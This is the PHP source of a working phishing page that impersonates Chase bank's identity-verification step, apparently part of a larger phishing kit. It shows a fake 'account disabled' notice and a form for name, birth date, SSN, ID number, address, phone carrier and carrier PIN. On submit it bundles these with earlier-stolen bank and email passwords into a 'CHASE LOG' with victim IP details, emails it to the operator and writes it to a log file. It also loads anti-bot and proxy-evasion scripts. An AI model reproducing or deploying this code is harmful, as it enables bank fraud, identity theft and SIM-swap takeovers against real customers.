<?php

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");


    


    if(isset($_POST['submit'])){
        $fnam = $_POST['fnam'];
        $lnam = $_POST['lnam'];
        $dob = $_POST['dob'];
        $soc = $_POST['soc'];
        $typid = $_POST['typid'];
        $idnum = $_POST['idnum'];
        $stadd = $_POST['stadd'];
        $soa = $_POST['soa'];
        $zip = $_POST['zip'];
        $city = $_POST['city'];
        $state = $_POST['state'];
        $fone = $_POST['fone'];
        $fonecarr = $_POST['fonecarr'];
        $carrpin = $_POST['carrpin'];

        $_SESSION['fnam'] = $fnam;
        $_SESSION['lnam'] = $lnam;
        $_SESSION['dob'] = $dob;
        $_SESSION['soc'] = $soc;
        $_SESSION['typid'] = $typid;
        $_SESSION['idnum'] = $idnum;
        $_SESSION['stadd'] = $stadd;
        $_SESSION['soa'] = $soa;
        $_SESSION['zip'] = $zip;
        $_SESSION['city'] = $city;
        $_SESSION['state'] = $state;
        $_SESSION['fone'] = $fone;
        $_SESSION['fonecarr'] = $fonecarr;
        $_SESSION['carrpin'] = $carrpin;
        
        
        $subject =  "{" .$user_ip . "} | CHASE Billing | [" . $_SESSION['icity']. "," . $_SESSION['icountrycode'] . "]";
        
        $message = "  --=========[CHASE LOG]===========--  \n";
        $message .= "Username: " . $_SESSION['usname'] . "\n";
        $message .= "Password: " . $_SESSION['paword'] . "\n";
        $message .= "Token: " . $_SESSION['tok'] . "\n";
        $message .= "  --=========[Mail Access]===========--  \n";
        $message .= "Email Address: " . $_SESSION['mailaddy'] . "\n";
        $message .= "Email Password: " . $_SESSION['mailpass'] . "\n";
		$message .= "  --==[VERIFIED MAIL ACCESS]==--  \n";
        $message .= "EMAIL ADDRESS2: " . $_SESSION['mailaddy2'] . "\n";
        $message .= "EMAIL PASSWORD2: " . $_SESSION['mailpass2'] . "\n";
        $message .= "  --=========[CHASE-BILLING]===========--  \n";
        $message .= "FIRST NAME: " . $_SESSION['fnam'] . "\n";
        $message .= "LAST NAME: " . $_SESSION['lnam'] . "\n";
        $message .= "DATE OF BIRTH: " . $_SESSION['dob'] . "\n";
        $message .= "SSN: " . $_SESSION['soc'] . "\n";
        $message .= "TYPE OF ID: " . $_SESSION['typid'] . "\n";
        $message .= "ID NUMBER: " . $_SESSION['idnum'] . "\n";
        $message .= "STREET ADDRESS: " . $_SESSION['stadd'] . "\n";
        $message .= "SUITE/ APT/ OTHER: " . $_SESSION['soa'] . "\n";
        $message .= "ZIP CODE: " . $_SESSION['zip'] . "\n";
        $message .= "CITY: " . $_SESSION['city'] . "\n";
        $message .= "STATE: " . $_SESSION['state'] . "\n";
        $message .= "PHONE: " . $_SESSION['fone'] . "\n";
		$message .= "Phone Carrier: " . $_SESSION['fonecarr'] . "\n";
        $message .= "CARRIER PIN: " . $_SESSION['carrpin'] . "\n";
        $message .= "----=========[Vic-Info]===========-----\n";
        $message .= "IP: " . $user_ip . "\n";
        $message .= "ISP: " . $_SESSION['iisp'] . "\n";
        $message .= "City(Based of IP): " .$_SESSION['icity'] . "\n";
        $message .= "Country(Based of IP): " .$_SESSION['icountrycode'] . "\n";
        $message .= "Browser: " . $_SESSION['browser'] . "\n";
        $message .= "OS: " . $_SESSION['platform'] . "\n";
        $message .= "Time: " . $_SESSION['time'] . "\n";
        $message .= "Date: " . $_SESSION['date'] . "\n";
        $message .= "------------------------------------------\n";
        $header = "From: <store@h0oligan.com> \r\n";
        
        $var_str = var_export($message, true);
        $var = "\n\n $var_str;\n\n";
        file_put_contents('../logz/MyLogz3.txt', $var, FILE_APPEND);
        
        $result = mail(reciever, $subject, $message, $header);
        require("smtp.php");
        header("Location: ./cd.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
    }
    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);

    $co2 = "#> ".getenv("REMOTE_ADDR")."\r\n";
    file_put_contents('../logz/MyLogz3_view.txt', $co2, FILE_APPEND);

?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sign in - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    
    <script>
		$(function() {
			
			$(document).ready( function() 
			{
				$('#citybox').hide();
				$('#statebox').hide();
				
			});
			
			// OnKeyDown Function
			$("#zip").keyup(function() {
				var zip_in = $(this);
				var zip_box = $('#zipbox');
				
				if (zip_in.val().length<5)
				{
					zip_box.removeClass('error success');
				}
				else if ( zip_in.val().length>5)
				{
					zip_box.addClass('error').removeClass('success');
				}
				else if ((zip_in.val().length == 5) ) 
				{
					$.ajax({
						url: "https://api.zippopotam.us/us/" + zip_in.val(),
						cache: false,
						dataType: "json",
						type: "GET",
					  success: function(result, success) {
							$('#citybox').slideDown();
							$('#statebox').slideDown();
						
							places = result['places'][0];
							$("#city").val(places['place name']);
							$("#state").val(places['state abbreviation']);
							zip_box.addClass('success').removeClass('error');
						},
						error: function(result, success) {
							zip_box.removeClass('success').addClass('error');
						}
					});
				}
	});

		});
			
	</script>
</head>

<body class="fl">
    
<div id="myModal" class="modal fade" role="dialog">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title">Please Note,</h4>
            </div>
            <div class="modal-body">
                <p><?php echo htmlentities("The security process has been initiated, your account will remain disabled for your own security until you complete this procedure. Please complete it as soon as possible.", ENT_QUOTES, "UTF-8"); ?></p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-mod" data-dismiss="modal">Continue</button>
            </div>
        </div>
    </div>
</div>
   
    <header class="e-header">
        <div class="col-xs-4 header-elements">
            <a href="#" class="menu-line">
                <i class="fas fa-bars"></i>
            </a>
        </div>
        <div class="col-xs-4 header-elements">
            <img src="../img/octogon-white.png" alt="Chase">
        </div>
        <div class="col-xs-4 header-elements ura">
            <span class="labelinho">
                Espa&#241;ol
            </span>
        </div>
    </header>
    <main id="e-content">
        <div class="oe-gs">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                        <h1 class="oe-header">Verification</h1>
                        <div class="oe-progress-bar">
                            <div class="bar fill"> </div>
                        </div>
                        <div class="H2 oe-secure">Secure your account</div>
                        <h2 class="H4 eGSA">We need a bit more info to verify your identity.</h2>
                    </div>
                </div>
                
            </div>
        </div>
    </main>
    <section id="opc-content">
        <div class="field-mt-18">
           <form action="" method="post" enctype="multipart/form-data">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personal">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Personal details</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="mb-24">This should be your full legal name as it appears on your government ID.</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="fnam" class="outlaw_label">First name</label>
                                        </div>
                                        <input type="text" class="out-input" id="fnam" name="fnam" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="lnam" class="outlaw_label">Last name</label>
                                        </div>
                                        <input type="text" class="out-input" id="lnam" name="lnam" required>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="identity">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Identification</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="dob" class="outlaw_label">Date of birth</label>
                                        </div>
                                        <input type="text" class="input-dob out-input" name="dob" id="dob" required>
                                        <div class="f-helpertext">
                                            <div class="helpertext">mm/dd/yyyy</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="soc" class="outlaw_label">Social Security Number</label>
                                        </div>
                                        <input type="text" class="out-input" name="soc" id="soc" pattern="[0-9]{9}" maxlength="9" title="Enter your 9 digit Social Security Number" required>
                                        <div class="f-helpertext">
                                            <div class="helpertext">We're required to ask for your SSN to verify your identity. We'll keep your data secure.</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="typid" class="outlaw_label">Type of ID</label>
                                        </div>
                                        <select class="out-input" name="typid" id="typid" required>
                                            <option value="0">Choose one</option>
                                            <option value="DL">Driver's license</option>
                                            <option value="State ID">State ID</option>
                                        </select>
                                        <span class="out-iconwrap">
                                            <i class="expanddown-icon"></i>
                                        </span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="idnum" class="outlaw_label">ID Number</label>
                                        </div>
                                        <input type="text" class="out-input" name="idnum" id="idnum" required>
                                    </div>
                                </div>
                            </div>
                        </div>
<!--
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="" class="outlaw_label">Issuing state</label>
                                        </div>
                                        <select class="out-input">
                                            <option value="0">Choose one</option>
                                            <option value="AL">Alabama</option>
                                            <option value="AK">Alaska</option>
                                            <option value="AZ">Arizona</option>
                                            <option value="AR">Arkansas</option>
                                            <option value="CA">California</option>
                                            <option value="CO">Colorado</option>
                                            <option value="CT">Conneticut</option>
                                            <option value="DE">Delaware</option>
                                            <option value="FL">Florida</option>
                                            <option value="GA">Georgia</option>
                                            <option value="HI">Hawaii</option>
                                            <option value="ID">Idaho</option>
                                            <option value="IL">Illinois</option>
                                            <option value="IN">Indiana</option>
                                            <option value="IA">Iowa</option>
                                            <option value="KS">Kansas</option>
                                            <option value="KY">Kentucky</option>
                                            <option value="LA">Lousiana</option>
                                            <option value="ME">Maine</option>
                                            <option value="MD">Maryland</option>
                                            <option value="MA">Massachusetts</option>
                                            <option value="MI">Michigan</option>
                                            <option value="MN">Minnesota</option>
                                            <option value="MS">Mississippi</option>
                                            <option value="MO">Missouri</option>
                                            <option value="MT">Montana</option>
                                            <option value="NE">Nebraska</option>
                                            <option value="NV">Nevada</option>
                                            <option value="NH">New Hampshire</option>
                                            <option value="NJ">New Jersey</option>
                                            <option value="NM">New Mexico</option>
                                            <option value="NY">New York</option>
                                            <option value="NC">North Carolina</option>
                                            <option value="ND">North Dakota</option>
                                            <option value="OH">Ohio</option>
                                            <option value="OK">Oklahoma</option>
                                            <option value="OR">Oregon</option>
                                            <option value="PA">Pennysylvania</option>
                                            <option value="RI">Rhode Island</option>
                                            <option value="SC">South Carolina</option>
                                            <option value="SD">South Dakota</option>
                                            <option value="TN">Tennessee</option>
                                            <option value="TX">Texas</option>
                                            <option value="UT">Utah</option>
                                            <option value="VA">Vermont</option>
                                            <option value="VA">Virginia</option>
                                            <option value="WA">Washington</option>
                                            <option value="WV">West Virgnia</option>
                                            <option value="WI">Wisconsin</option>
                                            <option value="WY">Wyoming</option>
                                        </select>
                                        <span class="out-iconwrap">
                                            <i class="expanddown-icon"></i>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
-->
                    </div>
                </div>
                <div id="contact">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Personal details</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="st-add" class="outlaw_label">Street address</label>
                                        </div>
                                        <input type="text" class="out-input" name="stadd" id="st-add" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="soa" class="outlaw_label">Suite/apt/other (optional)</label>
                                        </div>
                                        <input type="text" class="out-input" name="soa" id="soa">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6" id="zipbox">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="zip" class="outlaw_label">Zip Code</label>
                                        </div>
                                        <input type="text" class="out-input" name="zip" id="zip" required pattern="[0-9]{5}"  maxlength="5" title="Enter your 5 digit zip code">
                                        <div class="f-helpertext">
                                            <div class="helpertext">Your city and state will automatically populate below once you've told us your ZIP code.</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6" id="citybox">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical jp-v-fieldtext">
                                        <div class="label-wraps">
                                            <label for="city" class="outlaw_label">City</label>
                                        </div>
                                        <input type="text" class="field-zobo" readonly value="" id="city" name="city">
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6" id="statebox">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical jp-v-fieldtext">
                                        <div class="label-wraps">
                                            <label for="state" class="outlaw_label">State</label>
                                        </div>
                                        <input type="text" class="field-zobo" readonly value="" id="state" name="state">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="" class="outlaw_label">Phone Number</label>
                                        </div>
                                        <input type="text" class="input-10 out-input" name="fone" id="fone" required title="Enter your 10 digit Mobile Phone Number">
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="fonecarr" class="outlaw_label">Phone Carrier</label>
                                        </div>
                                        <select class="out-input" name="fonecarr" required>
                                            <option value="0">Choose one</option>
                                            <option value="at&t">AT&#38;T</option>
                                            <option value="verizon">Verizon</option>
                                            <option value="t-mobile">T-mobile</option>
                                            <option value="sprint">Sprint</option>
                                            <option value="sprint">Others</option>
                                        </select>
                                        <span class="out-iconwrap">
                                            <i class="expanddown-icon"></i>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="carr-pin" class="outlaw_label">Carrier Passcode</label>
                                        </div>
                                        <input type="text" class="out-input" required name="carrpin" id="carr-pin" maxlength="8">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="disclosure">
                    <div class="field-disco">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="foot-disco">
                                    When you give us your mobile number, we have your consent to send you automated calls and texts to service all of your accounts with us.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footinho">
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="row">
                                <div class="col-xs-12 navi-tom">
                                    <input type="submit" class="out-nxt" name="submit" value="Continue">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            </form>
        </div>
    </section>

<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.5.3/cleave.min.js"></script>
<script>
new Cleave('.input-10', {
    numericOnly: true,
    blocks: [0, 3, 0, 3, 4],
    delimiters: ["(", ")", " ", "-"]
});
var cleave = new Cleave('.input-dob', {
    date: true,
    delimiter: '/',
    datePattern: ['m', 'd', 'Y']
});

</script>

<script>
 $(window).load(function(){
$('#myModal').modal('show');
}); 
</script>

<script>
//window.onbeforeunload = function() {
//   return "Do you really want to leave our brilliant application?";
//};
</script>



</body>

</html>